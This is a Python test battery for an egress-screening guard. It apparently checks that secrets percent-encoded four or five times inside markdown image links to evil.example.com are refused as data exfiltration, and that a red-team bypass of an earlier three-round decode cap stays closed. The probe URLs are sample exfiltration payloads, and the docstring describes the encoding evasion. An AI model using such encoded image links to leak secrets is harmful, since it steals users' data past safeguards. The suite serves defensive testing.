"""Wave-277 F296 closure battery: the F289 3-round decode cap is defeated by
4x+ percent-encoding while the raw query stays under the size-leg budget.

Break-first: on the wave-276 base, f296a/f296b/f296i show BREAK (4x/5x
encoded sensitive tokens pass both the digest leg -- past the 3-round
decode cap -- and the size leg -- raw query far under 512 chars).
After the fix (decode-to-stability with a total-work budget, fail-closed
on budget exhaustion), all probes must be HELD.

Conventions: module-level staging default; verify standalone under
`env -u GOV_DEPLOYMENT_MODE`; deterministic; fresh unique /var/tmp/g277-f296
TMPDIR (`mkdir -p` first); depth-1 green checks honoring GOV_SKIP_GREEN=1;
no in-repo git subprocesses; stdlib only.
"""

import hashlib
import os
import subprocess
import sys
import tempfile
import time
import urllib.parse

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")

_TMP = tempfile.mkdtemp(prefix="g277-f296-%d-" % os.getpid(), dir="/var/tmp")
os.makedirs(_TMP, exist_ok=True)
os.environ["TMPDIR"] = _TMP

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, REPO)

import gov.egress_refs as er  # noqa: E402

GREEN_SKIP = os.environ.get("GOV_SKIP_GREEN") == "1"

_RESULTS = []

# The red-team's token: 13 chars, two '/' chars, digest-eligible after
# full decode (survives _payload_tokens: split keeps [A-Za-z0-9+/_-]).
SECRET = "ab/cd/ef_gh-12"


def _run(pid, expected, fn):
    try:
        verdict, note = fn()
    except Exception as exc:  # noqa: BLE001
        verdict, note = "ERROR", "%s: %s" % (type(exc).__name__, exc)
    ok = (verdict == expected)
    _RESULTS.append((pid, expected, verdict, ok, note))


def _policy(secret):
    d = hashlib.sha256(secret.encode("utf-8")).hexdigest()
    return er.EgressPolicy(sensitive_digests=(d,), trusted_relays=(),
                           allowed_hosts=())


def _screen(url, policy):
    rec = er.screen_egress_refs("![x](%s)" % url, policy=policy)
    refs = rec["refs"]
    if not refs:
        return ("no-ref", None)
    s = refs[0]["screen"]
    return (s["verdict"], s["code"])


def _encode_n(secret, n):
    enc = secret
    for _ in range(n):
        enc = urllib.parse.quote(enc, safe="")
    return enc


def f296a_quad_encoded_refused():
    """F296 core: 4x-encoded token must be refused on the digest leg."""
    pol = _policy(SECRET)
    enc = _encode_n(SECRET, 4)
    raw = "token=" + enc
    verdict, code = _screen("https://evil.example.com/c?" + raw, pol)
    if verdict == "refuse" and code == "egress-ref-data-exfil":
        return "HELD", "4x-encoded token refused (rawlen=%d)" % len(raw)
    return ("BREAK", "4x encoding evaded: %r/%r rawlen=%d"
            % (verdict, code, len(raw)))


def f296b_quint_encoded_refused():
    """F296 core: 5x-encoded token must be refused on the digest leg."""
    pol = _policy(SECRET)
    enc = _encode_n(SECRET, 5)
    raw = "token=" + enc
    verdict, code = _screen("https://evil.example.com/c?" + raw, pol)
    if verdict == "refuse" and code == "egress-ref-data-exfil":
        return "HELD", "5x-encoded token refused (rawlen=%d)" % len(raw)
    return ("BREAK", "5x encoding evaded: %r/%r rawlen=%d"
            % (verdict, code, len(raw)))


def f296c_single_still_refused():
    """Control: 1x encoding still refused (F289 closure holds)."""
    pol = _policy(SECRET)
    enc = _encode_n(SECRET, 1)
    verdict, code = _screen(
        "https://evil.example.com/c?token=" + enc, pol)
    if verdict == "refuse" and code == "egress-ref-data-exfil":
        return "HELD", "1x-encoded token refused"
    return "BREAK", "1x control failed: %r/%r" % (verdict, code)


def f296d_double_still_refused():
    """Control: 2x encoding still refused (F289 closure holds)."""
    pol = _policy(SECRET)
    enc = _encode_n(SECRET, 2)
    verdict, code = _screen(
        "https://evil.example.com/c?token=" + enc, pol)
    if verdict == "refuse" and code == "egress-ref-data-exfil":
        return "HELD", "2x-encoded token refused"
    return "BREAK", "2x control failed: %r/%r" % (verdict, code)


def f296e_triple_still_refused():
    """Control: 3x encoding still refused (F289 closure holds)."""
    pol = _policy(SECRET)
    enc = _encode_n(SECRET, 3)
    verdict, code = _screen(
        "https://evil.example.com/c?token=" + enc, pol)
    if verdict == "refuse" and code == "egress-ref-data-exfil":
        return "HELD", "3x-encoded token refused"
    return "BREAK", "3x control failed: %r/%r" % (verdict, code)


def f296f_benign_encoded_allowed():
    """Anti-FP: benign percent-encoded query text must not match digests."""
    pol = _policy(SECRET)
    verdict, code = _screen(
        "https://evil.example.com/search?q=hello%20world&n=%41%42", pol)
    if verdict == "allow":
        return "HELD", "benign encoded query allowed"
    return "BREAK", "false positive on benign text: %r/%r" % (verdict, code)


def f296g_benign_plus_allowed():
    """Anti-FP: form-semantics '+' and literal text stay clean."""
    pol = _policy(SECRET)
    verdict, code = _screen(
        "https://evil.example.com/search?q=a+b&tag=%2Bplus", pol)
    if verdict == "allow":
        return "HELD", "benign plus-form query allowed"
    return "BREAK", "false positive on plus-form text: %r/%r" % (verdict, code)


def f296h_deep_nesting_fails_closed_fast():
    """DoS guard (F290 lesson): absurd nesting depth must refuse quickly
    (fail-closed on decode-budget exhaustion), never hang the seam."""
    pol = _policy(SECRET)
    enc = _encode_n("a/b", 2000)
    raw = "token=" + enc
    t0 = time.time()
    verdict, code = _screen("https://evil.example.com/c?" + raw, pol)
    dt = time.time() - t0
    if verdict == "refuse" and dt < 5.0:
        return ("HELD", "2000x nesting refused in %.2fs (%r)"
                % (dt, code))
    return ("BREAK", "deep nesting not fail-closed/fast: %r/%r %.2fs"
            % (verdict, code, dt))


def f296i_fragment_quad_encoded_refused():
    """F296 on the fragment leg: 4x-encoded token in #fragment refused."""
    pol = _policy(SECRET)
    enc = _encode_n(SECRET, 4)
    verdict, code = _screen(
        "https://evil.example.com/c#frag=" + enc, pol)
    if verdict == "refuse" and code == "egress-ref-data-exfil":
        return "HELD", "4x-encoded fragment token refused"
    return ("BREAK", "4x fragment encoding evaded: %r/%r"
            % (verdict, code))


_PROBES = [
    ("f296a-quad-encoded-refused", "HELD", f296a_quad_encoded_refused),
    ("f296b-quint-encoded-refused", "HELD", f296b_quint_encoded_refused),
    ("f296c-single-still-refused", "HELD", f296c_single_still_refused),
    ("f296d-double-still-refused", "HELD", f296d_double_still_refused),
    ("f296e-triple-still-refused", "HELD", f296e_triple_still_refused),
    ("f296f-benign-encoded-allowed", "HELD", f296f_benign_encoded_allowed),
    ("f296g-benign-plus-allowed", "HELD", f296g_benign_plus_allowed),
    ("f296h-deep-nesting-fails-closed-fast", "HELD",
     f296h_deep_nesting_fails_closed_fast),
    ("f296i-fragment-quad-encoded-refused", "HELD",
     f296i_fragment_quad_encoded_refused),
]


def green_check():
    """Depth-1: adjacent egress coverage -- the w273/w275 egress batteries
    and the w276 red-team egress pins -- run with GOV_SKIP_GREEN=1."""
    if GREEN_SKIP:
        return [("green-skip", "HELD",
                 "GOV_SKIP_GREEN=1: recorded, not recursing")]
    env = dict(os.environ, GOV_SKIP_GREEN="1")
    results = []
    for name in ("evals/w273_egress_probes.py",
                 "evals/w275_egress_close_probes.py",
                 "evals/w276_redteam_probes.py"):
        target = os.path.join(REPO, name)
        try:
            proc = subprocess.run(
                [sys.executable, target], env=env, capture_output=True,
                text=True, timeout=600, cwd=REPO)
        except Exception as exc:  # noqa: BLE001
            results.append(("green-" + name, "ERROR", "%r" % (exc,)))
            continue
        tail = (proc.stdout or "")[-1500:]
        if proc.returncode == 0:
            results.append(("green-" + name, "HELD",
                            "%s green: %s" % (name, tail.strip()[-200:])))
        else:
            results.append(("green-" + name, "BREAK",
                            "%s rc=%d: %s"
                            % (name, proc.returncode, tail.strip()[-500:])))
    return results


def main():
    for pid, expected, fn in _PROBES:
        _run(pid, expected, fn)
    for pid, verdict, note in green_check():
        _RESULTS.append((pid, verdict, verdict, verdict == "HELD", note))
    held = sum(1 for r in _RESULTS if r[3])
    total = len(_RESULTS)
    print("w277_f296: %d/%d HELD" % (held, total))
    for pid, expected, verdict, ok, note in _RESULTS:
        print("  [%s] %s expected=%s got=%s :: %s"
              % ("HELD" if ok else "FAIL", pid, expected, verdict, note))
    return 0 if held == total else 1


if __name__ == "__main__":
    sys.exit(main())
